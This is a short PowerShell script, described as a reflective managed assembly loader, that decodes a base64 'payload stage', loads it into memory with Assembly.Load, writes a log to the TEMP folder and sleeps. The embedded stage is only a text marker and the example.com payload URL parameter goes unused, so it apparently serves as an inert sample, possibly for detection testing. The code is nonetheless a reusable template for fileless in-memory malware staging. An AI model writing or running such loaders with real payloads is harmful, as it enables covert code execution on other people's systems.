
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://example.com/payload.bin',
    [int]$TimeoutSec = 103
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo0ZDd3aGFyb29j")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Start-Sleep -Seconds 19
